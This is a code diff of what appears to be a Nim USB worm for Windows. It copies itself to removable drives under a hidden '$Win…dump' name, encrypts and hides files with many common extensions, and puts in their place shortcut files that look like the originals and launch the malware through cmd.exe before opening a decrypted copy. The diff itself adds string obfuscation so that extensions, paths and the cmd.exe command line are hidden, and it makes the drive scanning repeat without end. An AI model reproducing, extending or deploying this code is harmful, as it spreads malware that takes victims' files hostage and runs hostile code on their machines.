@@ -14,8 +14,10 @@ from os import getAppFilename
 from os import copyFile
 from os import `/`
 from os import getEnv
-from os import tryRemoveFile
 from os import existsFile
+from os import sleep
+
+from ../functions/removeFile import removeFileOrSleep
 
 from bitops import bitor
 
@@ -66,7 +68,9 @@ from winim/winstr import `$`
 from winim/utils import `&`
 from winim/utils import winimConverterBooleanToBOOL
 
-import ../more/xxtea
+from ../more/xxtea import encrypt
+from ../functions/hideString import d
+from ../functions/hideString import e
 
 from ../flags import INFECT_ENCRYPTION_KEY
 
@@ -74,97 +78,97 @@ type Icons = enum
   shell32, imageres, wmploc
 
 const extensions = [
-  (".mp3", wmploc, 60),     # MP3 audio file
-  (".mpa", shell32, 0),     # MPEG-2 audio file
-  (".wav", wmploc, 62),     # WAV file
-  (".7z", shell32, 0),      # 7-Zip compressed file
-  (".arj", shell32, 0),     # ARJ compressed file
-  (".deb", shell32, 0),     # Debian software package file
-  (".pkg", shell32, 0),     # Package file
-  (".rar", shell32, 0),     # RAR file
-  (".rpm", shell32, 0),     # Red Hat Package Manager
-  (".tar.gz", shell32, 0),  # Tarball compressed file
-  (".z", shell32, 0),       # Z compressed file
-  (".zip", shell32, 0),     # Zip compressed file"
-  (".bin", shell32, 0),     # Binary disc image
-  (".dmg", shell32, 0),     # macOS X disk image
-  (".iso", shell32, 0),     # ISO disc image
-  (".toast", shell32, 0),   # Toast disc image
-  (".csv", shell32, 0),     # Comma separated value file
-  (".dbf", shell32, 0),     # Database file
-  (".log", shell32, 0),     # Log file
-  (".mdb", shell32, 0),     # Microsoft Access database file
-  (".sav", shell32, 0),     # Save file (e.g., game save file)
-  (".sql", shell32, 0),     # SQL database file
-  (".tar", shell32, 0),     # Linux / Unix tarball file archive
-  (".xml", shell32, 0),     # XML file
-  (".email", shell32, 0),   # Outlook Express e-mail message file.
-  (".eml", shell32, 0),  # E-mail message file from multiple e-mail clients, including Gmail.
-  (".emlx", shell32, 0),    # Apple Mail e-mail file.
-  (".msg", shell32, 0),     # Microsoft Outlook e-mail message file.
-  (".oft", shell32, 0),     # Microsoft Outlook e-mail template file.
-  (".ost", shell32, 0),     # Microsoft Outlook offline e-mail storage file.
-  (".pst", shell32, 0),     # Microsoft Outlook e-mail storage file.
-  (".vcf", shell32, 0),     # E-mail contact file.
-  (".apk", shell32, 0),     # Android package file
-  (".bat", imageres, 64),   # Batch file
-  (".bin", shell32, 0),     # Binary file
-  (".cgi", shell32, 0),
-  (".pl", shell32, 0),      # Perl script file
-  (".com", shell32, 0),     # MS-DOS command file
-  (".exe", imageres, 11),   # Executable file
-  (".gadget", shell32, 0),  # Windows gadget
-  (".jar", shell32, 0),     # Java Archive file
-  (".msi", imageres, 163),  # Windows installer package
-  (".py", shell32, 0),      # Python file
-  (".wsf", shell32, 0),     # Windows Script File
-  (".ai", shell32, 0),      # Adobe Illustrator file
-  (".bmp", imageres, 66),   # Bitmap image
-  (".gif", imageres, 67),   # GIF image
-  (".ico", shell32, 0),     # Icon file
-  (".jpeg", imageres, 68),
-  (".jpg", imageres, 68),   # JPEG image
-  (".png", imageres, 79),   # PNG image
-  (".ps", shell32, 0),      # PostScript file
-  (".psd", shell32, 0),     # PSD image
-  (".svg", shell32, 0),     # Scalable Vector Graphics file
-  (".tif", imageres, 160),
-  (".tiff", imageres, 160), # TIFF image
-  (".key", shell32, 0),     # Keynote presentation
-  (".odp", shell32, 0),     # OpenOffice Impress presentation file
-  (".pps", shell32, 0),     # PowerPoint slide show
-  (".ppt", shell32, 0),     # PowerPoint presentation
-  (".pptx", shell32, 0),    # PowerPoint Open XML presentation
-  (".ods", shell32, 0),     # OpenOffice Calc spreadsheet file
-  (".xls", shell32, 0),     # Microsoft Excel file
-  (".xlsm", shell32, 0),    # Microsoft Excel file with macros
-  (".xlsx", shell32, 0),    # Microsoft Excel Open XML spreadsheet file
-  (".icns", shell32, 0),    # macOS X icon resource file
-  (".ico", shell32, 0),     # Icon file
-  (".msi", shell32, 0),     # Windows installer package
-  (".3g2", shell32, 0),     # 3GPP2 multimedia file
-  (".3gp", shell32, 0),     # 3GPP multimedia file
-  (".avi", wmploc, 59),     # AVI file
-  (".flv", shell32, 0),     # Adobe Flash file
-  (".h264", shell32, 0),    # H.264 video file
-  (".m4v", shell32, 0),     # Apple MP4 video file
-  (".mkv", shell32, 0),     # Matroska Multimedia Container
-  (".mov", shell32, 0),     # Apple QuickTime movie file
-  (".mp4", shell32, 0),     # MPEG4 video file
-  (".mpg", wmploc, 61),     # MPEG video file
-  (".mpeg", wmploc, 61),    # MPEG video file
-  (".rm", shell32, 0),      # RealMedia file
-  (".swf", shell32, 0),     # Shockwave flash file
-  (".vob", shell32, 0),     # DVD Video Object
-  (".wmv", wmploc, 64),     # Windows Media Video file
-  (".doc", shell32, 0),
-  (".docx", shell32, 0),    # Microsoft Word file
-  (".odt", shell32, 0),     # OpenOffice Writer document file
-  (".pdf", shell32, 0),     # PDF file
-  (".rtf", shell32, 0),     # Rich Text Format
-  (".tex", shell32, 0),     # A LaTeX document file
-  (".txt", imageres, 97),   # Plain text file
-  (".wpd", shell32, 0),     # WordPerfect document
+  (e".mp3", wmploc, 60),     # MP3 audio file
+  (e".mpa", shell32, 0),     # MPEG-2 audio file
+  (e".wav", wmploc, 62),     # WAV file
+  (e".7z", shell32, 0),      # 7-Zip compressed file
+  (e".arj", shell32, 0),     # ARJ compressed file
+  (e".deb", shell32, 0),     # Debian software package file
+  (e".pkg", shell32, 0),     # Package file
+  (e".rar", shell32, 0),     # RAR file
+  (e".rpm", shell32, 0),     # Red Hat Package Manager
+  (e".tar.gz", shell32, 0),  # Tarball compressed file
+  (e".z", shell32, 0),       # Z compressed file
+  (e".zip", shell32, 0),     # Zip compressed file"
+  (e".bin", shell32, 0),     # Binary disc image
+  (e".dmg", shell32, 0),     # macOS X disk image
+  (e".iso", shell32, 0),     # ISO disc image
+  (e".toast", shell32, 0),   # Toast disc image
+  (e".csv", shell32, 0),     # Comma separated value file
+  (e".dbf", shell32, 0),     # Database file
+  (e".log", shell32, 0),     # Log file
+  (e".mdb", shell32, 0),     # Microsoft Access database file
+  (e".sav", shell32, 0),     # Save file (e.g., game save file)
+  (e".sql", shell32, 0),     # SQL database file
+  (e".tar", shell32, 0),     # Linux / Unix tarball file archive
+  (e".xml", shell32, 0),     # XML file
+  (e".email", shell32, 0),   # Outlook Express e-mail message file.
+  (e".eml", shell32, 0),  # E-mail message file from multiple e-mail clients, including Gmail.
+  (e".emlx", shell32, 0),    # Apple Mail e-mail file.
+  (e".msg", shell32, 0),     # Microsoft Outlook e-mail message file.
+  (e".oft", shell32, 0),     # Microsoft Outlook e-mail template file.
+  (e".ost", shell32, 0),     # Microsoft Outlook offline e-mail storage file.
+  (e".pst", shell32, 0),     # Microsoft Outlook e-mail storage file.
+  (e".vcf", shell32, 0),     # E-mail contact file.
+  (e".apk", shell32, 0),     # Android package file
+  (e".bat", imageres, 64),   # Batch file
+  (e".bin", shell32, 0),     # Binary file
+  (e".cgi", shell32, 0),
+  (e".pl", shell32, 0),      # Perl script file
+  (e".com", shell32, 0),     # MS-DOS command file
+  (e".exe", imageres, 11),   # Executable file
+  (e".gadget", shell32, 0),  # Windows gadget
+  (e".jar", shell32, 0),     # Java Archive file
+  (e".msi", imageres, 163),  # Windows installer package
+  (e".py", shell32, 0),      # Python file
+  (e".wsf", shell32, 0),     # Windows Script File
+  (e".ai", shell32, 0),      # Adobe Illustrator file
+  (e".bmp", imageres, 66),   # Bitmap image
+  (e".gif", imageres, 67),   # GIF image
+  (e".ico", shell32, 0),     # Icon file
+  (e".jpeg", imageres, 68),
+  (e".jpg", imageres, 68),   # JPEG image
+  (e".png", imageres, 79),   # PNG image
+  (e".ps", shell32, 0),      # PostScript file
+  (e".psd", shell32, 0),     # PSD image
+  (e".svg", shell32, 0),     # Scalable Vector Graphics file
+  (e".tif", imageres, 160),
+  (e".tiff", imageres, 160), # TIFF image
+  (e".key", shell32, 0),     # Keynote presentation
+  (e".odp", shell32, 0),     # OpenOffice Impress presentation file
+  (e".pps", shell32, 0),     # PowerPoint slide show
+  (e".ppt", shell32, 0),     # PowerPoint presentation
+  (e".pptx", shell32, 0),    # PowerPoint Open XML presentation
+  (e".ods", shell32, 0),     # OpenOffice Calc spreadsheet file
+  (e".xls", shell32, 0),     # Microsoft Excel file
+  (e".xlsm", shell32, 0),    # Microsoft Excel file with macros
+  (e".xlsx", shell32, 0),    # Microsoft Excel Open XML spreadsheet file
+  (e".icns", shell32, 0),    # macOS X icon resource file
+  (e".ico", shell32, 0),     # Icon file
+  (e".msi", shell32, 0),     # Windows installer package
+  (e".3g2", shell32, 0),     # 3GPP2 multimedia file
+  (e".3gp", shell32, 0),     # 3GPP multimedia file
+  (e".avi", wmploc, 59),     # AVI file
+  (e".flv", shell32, 0),     # Adobe Flash file
+  (e".h264", shell32, 0),    # H.264 video file
+  (e".m4v", shell32, 0),     # Apple MP4 video file
+  (e".mkv", shell32, 0),     # Matroska Multimedia Container
+  (e".mov", shell32, 0),     # Apple QuickTime movie file
+  (e".mp4", shell32, 0),     # MPEG4 video file
+  (e".mpg", wmploc, 61),     # MPEG video file
+  (e".mpeg", wmploc, 61),    # MPEG video file
+  (e".rm", shell32, 0),      # RealMedia file
+  (e".swf", shell32, 0),     # Shockwave flash file
+  (e".vob", shell32, 0),     # DVD Video Object
+  (e".wmv", wmploc, 64),     # Windows Media Video file
+  (e".doc", shell32, 0),
+  (e".docx", shell32, 0),    # Microsoft Word file
+  (e".odt", shell32, 0),     # OpenOffice Writer document file
+  (e".pdf", shell32, 0),     # PDF file
+  (e".rtf", shell32, 0),     # Rich Text Format
+  (e".tex", shell32, 0),     # A LaTeX document file
+  (e".txt", imageres, 97),   # Plain text file
+  (e".wpd", shell32, 0),     # WordPerfect document
 ]
 
 
@@ -181,8 +185,9 @@ proc hideFile(path: string): void =
 
   SetFileAttributes(path, newAttr)
 
-proc createShortcut(sys32: string, file: string, path: string, iconPath: string,
-    iconIndex: int, originalFilePath: string, tmpFilePath: string): void =
+proc createShortcut(sys32: string, programPath: string, savePath: string,
+    iconPath: string, iconIndex: int, encryptedFilePath: string,
+        decryptedFilePath: string): void =
   var
     pIL: ptr IShellLink
     pPF: ptr IPersistFile
@@ -192,61 +197,65 @@ proc createShortcut(sys32: string, file: string, path: string, iconPath: string,
 
   pIL.QueryInterface(&IID_IPersistFile, cast[ptr PVOID](&pPF))
 
-  pIL.SetPath(sys32 / "cmd.exe")
-  pIL.SetArguments("/c \"\"" & file & "\" \"" & originalFilePath &
-      "\" && start /B \"\"\"\" \"" & file & "\" && start \"\"\"\" \"" &
-      tmpFilePath & "\"\"")
+  pIL.SetPath(sys32 / d e"cmd.exe")
+  pIL.SetArguments(
+    ## d(e("")) is different from d e"", see hideString.nim
+    d(e("/c \"\"")) & programPath & d(e("\" \"")) & encryptedFilePath & # run program and wait to decrypt file
+    d(e("\" && start /B \"\"\"\" \"")) & programPath & # run program to infect
+    d(e("\" && start \"\"\"\" \"")) & decryptedFilePath & d(e("\"\"")) # open file
+  )
 
   pIL.SetIconLocation(iconPath, int32 iconIndex)
 
-  pIl.SetShowCmd(7) # start as minimized
+  pIl.SetShowCmd(7) # start minimized
 
   pIL.Release()
 
-  pPF.Save(path, true)
+  pPF.Save(savePath, true)
 
   pPF.Release()
 
 proc encryptFile(filePath: string): void =
-  let input = readFile(filePath)
+  # save file contents
+  let data: string = readFile(filePath)
 
-  let encrypted = xxtea.encrypt(input, INFECT_ENCRYPTION_KEY)
+  # wait to remove the original file
+  removeFileOrSleep(filePath)
 
-  writeFile(filePath, encrypted)
-  # const decrypt_data = xxtea.decrypt(encrypt_data, key)
+  # write encrypted file
+  writeFile(filePath, encrypt(data, d INFECT_ENCRYPTION_KEY))
 
 proc checkDrive(dest: string, drivePath: string): void =
-  let sys32 = getEnv("SystemRoot") / "System32"
-  let tmp = getEnv("tmp")
+  let sys32 = getEnv(d e"SystemRoot") / d e"System32"
+  let tmp = getEnv(d e"tmp")
   for path in walkDirRec(drivePath):
     let (dir, name, fileExt) = splitFile(path)
 
-    for (ext, icon, index) in extensions:
-      var iconPath: string
+    for (extEncrypted, icon, index) in extensions:
+      let ext = d extEncrypted
       if fileExt == ext: # valid extension
         encryptFile(path)
         hideFile(path)
 
+        var iconPath: string
+
         case icon:
         of shell32:
-          iconPath = sys32 / "shell32.dll"
+          iconPath = sys32 / d e"shell32.dll"
         of imageres:
-          iconPath = sys32 / "imageres.dll"
+          iconPath = sys32 / d e"imageres.dll"
         of wmploc:
-          iconPath = sys32 / "wmploc.dll"
+          iconPath = sys32 / d e"wmploc.dll"
 
-        createShortcut(sys32, dest, dir / name & ".lnk", iconPath, index, path,
-            tmp / name & fileExt)
-
-        ## > create lnk file
-        ## > hide original
+        createShortcut(sys32, dest, dir / name & d e".lnk", iconPath, index,
+            path, tmp / name & fileExt)
         break
 
 
 proc searchForUSB(): void =
   let appName: string = getAppFilename()
-  for letter in "DEFGHIJKLMNOPQRSTUVWXYZ":
-    let drivePath: string = letter & r":\"
+  for letter in d e"DEFGHIJKLMNOPQRSTUVWXYZ":
+    let drivePath: string = letter & d e":\"
     let driveType: UINT = GetDriveTypeW(drivePath)
 
     if driveType == DRIVE_REMOVABLE:
@@ -263,9 +272,9 @@ proc searchForUSB(): void =
         var driveName: string = $lpVolumeNameBuffer
 
         if driveName == "":
-          driveName = "Drive"
+          driveName = d e"Drive"
 
-        let dest: string = drivePath / "$Win" & driveName & ".dump"
+        let dest: string = drivePath / d(e("$Win")) & driveName & d(e(".dump"))
         ## possible names:
         ## $Win
         ## $WinSearch
@@ -275,6 +284,8 @@ proc searchForUSB(): void =
           copyFile(appName, dest)
           hideFile(dest)
           checkDrive(dest, drivePath)
+  sleep(1000)
+  searchForUSB()
 
 proc initInfectThread*(): void {.thread.} =
   CoInitialize(nil)
